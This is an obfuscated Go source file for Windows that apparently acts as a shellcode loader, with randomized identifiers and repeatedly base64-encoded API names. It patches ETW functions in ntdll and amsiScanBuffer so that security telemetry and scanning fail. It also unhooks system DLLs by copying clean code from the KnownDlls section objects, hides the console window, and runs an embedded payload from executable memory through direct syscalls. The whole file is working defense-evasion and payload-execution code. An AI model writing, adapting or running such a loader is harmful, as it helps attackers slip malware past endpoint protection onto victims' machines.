
	
	package main

	
	

	import (
		filepe "debug/pe"
		"encoding/base64"
		"encoding/hex"
		
		"GkwFTBbOTMPus/GkwFTBbOTMPus"
		"strconv"
		"fmt"
		"syscall"
		"unsafe"
		"time"
		


		"golang.org/x/sys/windows"
		"golang.org/x/sys/windows/registry"
		"github.com/Binject/debug/pe"
		"github.com/awgh/rawreader"
	)
	


	const (
		QQAyc= 0x1F0FFF
	)
	var _ unsafe.Pointer
	var (
		oJMGvc uint16
		thKZ uint16
		WcXWFhpg int = 5
	)

	
	
	
	
	func BmjoAaY() string {
		WafZzMo, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
		OswLXwi, _, _ :=  WafZzMo.GetStringValue("CurrentVersion")
		VRWY, _, err := WafZzMo.GetIntegerValue("CurrentMajorVersionNumber")
		if err == nil{
			//gCuZ, _, _ := WafZzMo.GetIntegerValue("CurrentMinorVersionNumber")
			OswLXwi = strconv.FormatUint(VRWY, 10)
		}
		defer WafZzMo.Close()
		if OswLXwi == "10" {
			oJMGvc = 0x18
			thKZ = 0x50
		} else if OswLXwi == "6.3" {
			oJMGvc = 0x17
			thKZ = 0x4f
		} else if OswLXwi == "6.2" {
			oJMGvc = 0x16
			thKZ = 0x4e
		} else if OswLXwi == "6.1" {
			oJMGvc = 0x15
			thKZ= 0x4d
		}
		return OswLXwi 

	}

	func atSpaLr(jgPLgR string,) string {
		var vQgoT []byte
			vQgoT, _ = base64.StdEncoding.DecodeString(jgPLgR)
		qvvFJq := 1
		for i := 1; i < WcXWFhpg; i++ {
			vQgoT, _ = base64.StdEncoding.DecodeString(string(vQgoT))
			qvvFJq += i
		}
		return string(vQgoT)
	
	}

	

	func pGMUrhOFDoGt(show bool) {
		brJDIDmQvagdbQAi := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc(atSpaLr("Vmxkd1MxWXdNVWRTV0d4UVYwWmFjVlJYY0hObGJHUnpWMjEwYWxJd2NEQldWelZoWVRKU05rMUVhejA9"))
		NoxtnbdwVvPfemnMLB := syscall.NewLazyDLL(string([]byte{'u', 's', 'e', 'r', '3', '2',})).NewProc(atSpaLr("Vm14U1MySXlVblJWV0doaFUwVktjRmxzV2t0TmJIQkpXWHBzVVZWVU1Eaz0="))
		ieeGyhRPWkktgLUs, _, _ := brJDIDmQvagdbQAi.Call()
		if ieeGyhRPWkktgLUs == 0 {
			return
		}
		if show {
		var qBAYsolNGcr uintptr = 9
		NoxtnbdwVvPfemnMLB.Call(ieeGyhRPWkktgLUs, qBAYsolNGcr)
		} else {
		var LpQldiCHRhAUJjZ uintptr = 0
		NoxtnbdwVvPfemnMLB.Call(ieeGyhRPWkktgLUs, LpQldiCHRhAUJjZ)
		}
	}



	
	const (
		xqGvEnwS= 997
	)
	var RxFcIpZj error = syscall.Errno(xqGvEnwS)
	var mllN = syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc(atSpaLr("Vm0xd1QxTXlUa2hWYTJoWFlrVmFjVmxzVW5OalZtUnpZVVU1YkdKR1NsbFdiVFZUWVZVd2QySjZSVDA9"))


	func WvoLFu(pUDGcLhv uintptr, QXseetK uintptr, gNOPHdez *byte, ZpMfHE uintptr, ooXbDFIT *uintptr) (err error) {
		r1, _, e1 := syscall.Syscall6(mllN.Addr(), 5, uintptr(pUDGcLhv), uintptr(QXseetK), uintptr(unsafe.Pointer(gNOPHdez)), uintptr(ZpMfHE), uintptr(unsafe.Pointer(ooXbDFIT)), 0)
		if r1 == 0 {
			if e1 != 0 {
				err = fkzFiv(e1)
			} else {
				err = syscall.EINVAL
			}
		}
		return
	}

	func fkzFiv(e syscall.Errno) error {
		switch e {
		case 0:
			return nil
		case xqGvEnwS:
			return RxFcIpZj
		}
	
		return e
	}
	

	
	var JpIXRFlN = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(atSpaLr("VmxkNGIxVXdNSGhWYmxKUVZrVktiMVpxUm5ka01XUlZVMnRrVGxJd1dsbFVNV2hYVm0xS1YxZHVWbHBXYldoUVZGVmFkMWRXVGxWTlJEQTk="))
	var axArGf = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(atSpaLr("VmxkNGIxVXdNSGhUYkd4WVlsaG9jRmx0ZUV0V1JtUnpXa2QwYWxJd01UWldWekUwWVd4d05rMUVhejA9"))
	var TBbHCJ = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(atSpaLr("VmxkNGIxVXdNSGhUYkd4WVlsaG9jRmx0ZUV0WFZtdDVUVmhPVGxKdVFsZFdNbkJIWVZaSmVsbDZhejA9"))
	var hxDmoiZC = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(atSpaLr("VmxkNGIxVXdNSGhUYkd4WVlsaG9jRmx0ZUV0WFZtdDVUVmhPVGxKdVFsTlZSbEYzVUZFOVBRPT0="))

	func CHutTT() {
		WsaSrZNc := uintptr(0xffffffffffffffff)
		XPMNTvr := []uintptr{ JpIXRFlN.Addr(), axArGf.Addr(), TBbHCJ.Addr(), hxDmoiZC.Addr()}
		for i, _ := range XPMNTvr {
			JsdQqo, _ := hex.DecodeString("4833C0C3")
			var PKGG uintptr
			IUzUijT := len(JsdQqo)
			WvoLFu(WsaSrZNc, XPMNTvr[i], &JsdQqo[0], uintptr(uint32(IUzUijT)), &PKGG)
		}
	}

	func oTxWcWp(WsaSrZNc windows.Handle) {
		XPMNTvr := []uintptr{ JpIXRFlN.Addr(), axArGf.Addr(), TBbHCJ.Addr(), hxDmoiZC.Addr()}
		for i, _ := range XPMNTvr {
			JsdQqo, _ := hex.DecodeString("4833C0C3")
			var PKGG uintptr
			IUzUijT := len(JsdQqo)
			WvoLFu(uintptr(WsaSrZNc), XPMNTvr[i], &JsdQqo[0], uintptr(uint32(IUzUijT)), &PKGG)
		}
	}



	
	func AGFhxpR() {
		var JHKvKOpY uint64
		JHKvKOpY = 0xffffffffffffffff
		Ewovk, _ := windows.LoadLibrary(string([]byte{'a','m','s','i','.','d','l','l'}))
		hJCIh, _ := windows.GetProcAddress(Ewovk, string([]byte{'a','m','s','i','S','c','a','n','B','u','f','f','e','r'}))
		sOLYeN, _ :=  hex.DecodeString("B857000780C3")
		var hRcPr uintptr
		QaaCyt := len(sOLYeN)
		WvoLFu(uintptr(JHKvKOpY), uintptr(uint(hJCIh)), &sOLYeN[0], uintptr(uint32(QaaCyt)), &hRcPr)
	}
	

	var procReadProcessMemory = syscall.NewLazyDLL("kernel32.dll").NewProc("ReadProcessMemory")

	func NOWiiB() uintptr {
		var funcNtAllocateVirtualMemory = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc("NtAllocateVirtualMemory")
		handle := uintptr(0xffffffffffffffff)
		num := 2
		var add uintptr
		AllAddr := funcNtAllocateVirtualMemory.Addr()
		for i := 0; i < 20; i++ {
			rawr, _, _ := ReadProcessMemory(handle, AllAddr+uintptr(i), uintptr(num))
			f := fmt.Sprintf("%0x", rawr)
			if f == "0f05" {
				add = AllAddr + uintptr(i)
				return add
			}
		}
		return add
	}

	func ReadProcessMemory(hProcess uintptr, lpBaseAddress uintptr, nSize uintptr) (lpBuffer []uint8, lpNumberOfBytesRead int, ok bool) {
		var nBytesRead int
		buf := make([]uint8, nSize)
		ret, _, _ := procReadProcessMemory.Call(
			uintptr(hProcess),
			lpBaseAddress,
			uintptr(unsafe.Pointer(&buf[0])),
			nSize,
			uintptr(unsafe.Pointer(&nBytesRead)),
		)
	
		return buf, nBytesRead, ret != 0
	}
	
		

	func main() {
		
		CHutTT()
		AGFhxpR()
		time.Sleep(2519 * time.Millisecond)
		OswLXwi := BmjoAaY()
		
		if OswLXwi == "10" {
			MoUThRFuiXAwdH()
		}
		CHutTT()
		pGMUrhOFDoGt(false)
		zTNqlHkPOLAEkukcW := GkwFTBbOTMPus.RdQFcryXYNq()
		XNRhHQnnYXhhnY(zTNqlHkPOLAEkukcW)
	}

	
	func XNRhHQnnYXhhnY(zTNqlHkPOLAEkukcW []byte){
		UECFIpxItjJqLdXI := windows.NewLazySystemDLL("ntdll.dll")
		qPztIlywlyReFTYKd := windows.NewLazySystemDLL("kernel32")
		gXodKXkawkO := UECFIpxItjJqLdXI.NewProc("RtlCopyMemory")
		IAUAvLpzSbDXrCM := qPztIlywlyReFTYKd.NewProc("VirtualAlloc")

		var nDPTRqCDREZNkc, rsrBmvgudsUixgI uintptr
		var teuplZWkErw uintptr
		ADtWybneesgsEjbj := uintptr(0xffffffffffffffff)
		DwYCkKUWZeJE := uintptr(len(zTNqlHkPOLAEkukcW))
		rsrBmvgudsUixgI = 0x40
		nDPTRqCDREZNkc = 0x3000
		XHZhadUvvVwuQ, _, _ := IAUAvLpzSbDXrCM.Call(0, uintptr(len(zTNqlHkPOLAEkukcW)), nDPTRqCDREZNkc, rsrBmvgudsUixgI)

		
		gXodKXkawkO.Call(XHZhadUvvVwuQ, (uintptr)(unsafe.Pointer(&zTNqlHkPOLAEkukcW[0])), uintptr(len(zTNqlHkPOLAEkukcW)))
		
		


		GkwFTBbOTMPus.JrRypYnTZrrRoNlZFVR(
			thKZ, 
			ADtWybneesgsEjbj,
			(*uintptr)(unsafe.Pointer(&XHZhadUvvVwuQ)),
			&DwYCkKUWZeJE,
			0x20,
			&teuplZWkErw,
			)
		
		syscall.Syscall(XHZhadUvvVwuQ, 0, 0, 0, 0)
	}


	
	
		var MgCNbBVZBAiFnon      uint16
		var ATArQbBRQGaD uint16
		var wpSgBTbMgGRlUCGmze      uint16
		func MoUThRFuiXAwdH()  {
			xtLhnarJGp := []string{string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}),
			string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}),
			string([]byte{'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}),
			string([]byte{'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l'})}
		
	 	for i, _ := range xtLhnarJGp {
			KnownDLL(xtLhnarJGp[i])
			}
		}

		var procNtOpenSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtOpenSection")
		var procNtMapViewOfSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtMapViewOfSection")
		var procNtUnmapViewOfSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtUnmapViewOfSection")

		type sstring struct {
			PWstr *uint16
		}
	
		func (s sstring) String() string {
			return windows.UTF16PtrToString(s.PWstr)
		}
	
		func KnownDLL(KIgWrgRLmYo  string) []byte {
			
			var hFCUBYayMcgBNo , BhwIswGsfIUOjMo , lsabAARyKIrmqQ  uintptr
			tQrCPRQhwT := uintptr(0xffffffffffffffff)
			GZDexupJvPJr := "\\" + string([]byte{'K', 'n', 'o', 'w', 'n', 'D', 'l', 'l', 's'}) + "\\" + KIgWrgRLmYo 
			CPQrROKbooqilcjlx, _ := windows.NewNTUnicodeString(GZDexupJvPJr)
			CiUHduhFlpkna := windows.OBJECT_ATTRIBUTES{}
			CiUHduhFlpkna.Attributes = 0x00000040
			CiUHduhFlpkna.ObjectName = CPQrROKbooqilcjlx
			CiUHduhFlpkna.Length = uint32(unsafe.Sizeof(windows.OBJECT_ATTRIBUTES{}))
			cNKPLzAzmzu := NOWiiB()
			MgCNbBVZBAiFnon = 0x37
			azHUGUVwKH := 0x0004
			r, _ := GkwFTBbOTMPus.HpbfqvHvJsKhBX(
				MgCNbBVZBAiFnon, 
				cNKPLzAzmzu, 
				uintptr(unsafe.Pointer(&hFCUBYayMcgBNo)), 
				uintptr(azHUGUVwKH), 
				uintptr(unsafe.Pointer(&CiUHduhFlpkna)),
			)
			if r != 0 {
			}
			ATArQbBRQGaD = 0x28
			zero := 0
			one := 1
			GkwFTBbOTMPus.PvoReZYqnuy(
				ATArQbBRQGaD, 
				cNKPLzAzmzu, 
				hFCUBYayMcgBNo, 
				tQrCPRQhwT, 
				uintptr(unsafe.Pointer(&lsabAARyKIrmqQ)), 
				uintptr(zero), 
				uintptr(zero), 
				uintptr(zero), 
				uintptr(unsafe.Pointer(&BhwIswGsfIUOjMo)), 
				uintptr(one), 
				uintptr(zero), 
				uintptr(syscall.PAGE_READONLY),
			)
			YhPstOlGieASZSBAO := rawreader.New(lsabAARyKIrmqQ, int(BhwIswGsfIUOjMo))
			WvZuIpXKtGtopcyH, _ := pe.NewFileFromMemory(YhPstOlGieASZSBAO)
			jUiLyOAiRNN, err := WvZuIpXKtGtopcyH.Bytes()
			if err != nil {
			}
			eMynWCJPXVkhSIDDLI := WvZuIpXKtGtopcyH.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
			tsxwiUZlvnJVAc := jUiLyOAiRNN[eMynWCJPXVkhSIDDLI.Offset:eMynWCJPXVkhSIDDLI.Size]
			usGdALfxBdBbC, error := filepe.Open(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) +  KIgWrgRLmYo )
			if error != nil {
			}
			lvkaGKapHVuod := usGdALfxBdBbC.Section(".text")
			gdImYJqlRcVKPpPZ, error := windows.LoadDLL(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) +  KIgWrgRLmYo )
			if error != nil {
			}
			UMbwqKlTPbYGHzg := gdImYJqlRcVKPpPZ.Handle
			xBjUlrOoLLhCNHMJ  := uintptr(UMbwqKlTPbYGHzg)
			sCSbyrnZZoZ := uint(xBjUlrOoLLhCNHMJ) + uint(lvkaGKapHVuod.VirtualAddress)
			wpSgBTbMgGRlUCGmze = 0x50
			jdGwJdlTDwEDNzEx := uintptr(len(tsxwiUZlvnJVAc))
			var uhJmiihyxsVREzpOqf uintptr

			dcJOxnSjVKAvZBg, _ := GkwFTBbOTMPus.BROovpeiYktX(
				wpSgBTbMgGRlUCGmze, 
				cNKPLzAzmzu, 
				tQrCPRQhwT, 
				(*uintptr)(unsafe.Pointer(&sCSbyrnZZoZ)), 
				&jdGwJdlTDwEDNzEx, 
				0x40, 
				&uhJmiihyxsVREzpOqf,
			)
			if dcJOxnSjVKAvZBg != 0 {
			}
			JbBcZflywszt(tsxwiUZlvnJVAc, uintptr(sCSbyrnZZoZ))
			usGdALfxBdBbC.Close()
			dcJOxnSjVKAvZBg, _ = GkwFTBbOTMPus.BROovpeiYktX(
				wpSgBTbMgGRlUCGmze, 
				cNKPLzAzmzu, 
				tQrCPRQhwT, 
				(*uintptr)(unsafe.Pointer(&sCSbyrnZZoZ)), 
				&jdGwJdlTDwEDNzEx, 
				0x20, 
				&uhJmiihyxsVREzpOqf,
			)
			if dcJOxnSjVKAvZBg != 0 {
			}
			syscall.Syscall(uintptr(procNtUnmapViewOfSection.Addr()), 2, uintptr(tQrCPRQhwT), lsabAARyKIrmqQ, 0)
			return tsxwiUZlvnJVAc
		}


		func JbBcZflywszt(eJuNoUBZOAosNCIuM []byte, LgPjLGcwsQfaKZtt uintptr) {
			for pRjBenvQQIRfZTmE := uint32(0); pRjBenvQQIRfZTmE < uint32(len(eJuNoUBZOAosNCIuM)); pRjBenvQQIRfZTmE++ {
				mLHNXHLHpL := unsafe.Pointer(LgPjLGcwsQfaKZtt + uintptr(pRjBenvQQIRfZTmE))
				fuikUSIfopIGew := (*byte)(mLHNXHLHpL)
				*fuikUSIfopIGew = eJuNoUBZOAosNCIuM[pRjBenvQQIRfZTmE]
			}
		}

	
